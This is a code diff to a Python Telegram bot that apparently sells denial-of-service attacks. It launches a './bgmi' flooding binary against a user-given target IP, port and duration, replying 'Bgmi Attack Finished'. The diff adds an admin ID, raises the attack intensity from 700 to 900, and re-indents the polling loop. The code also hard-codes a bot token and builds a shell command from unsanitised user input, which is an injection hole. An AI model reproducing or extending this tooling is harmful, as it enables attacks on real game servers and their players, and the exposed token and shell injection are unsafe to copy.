@@ -9,7 +9,7 @@ import os
 bot = telebot.TeleBot('7283418311:AAGXE20Bb72LY4frnqDeBWcGYElDfiMLCfQ')
 
 # Join :- @Sivsiv11 # Admin user IDs
-admin_id = ["1338724139"]
+admin_id = ["1338724139","6667394815"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -491,7 +491,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_bgmi_reply(message, target, port, time)  # Join :- @Sivsiv11 # Call start_bgmi_reply function
-                full_command = f"./bgmi {target} {port} {time} 700"
+                full_command = f"./bgmi {target} {port} {time} 900"
                 subprocess.run(full_command, shell=True)
                 response = f"💥 Bgmi Attack Finished Now ⚡"
         else:
@@ -584,8 +584,10 @@ def broadcast_message(message):
 
 
 #bot.polling()
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(e)
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            logging.error(f"An error occurred while polling: {e}")
+        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
+        time.sleep(REQUEST_INTERVAL)
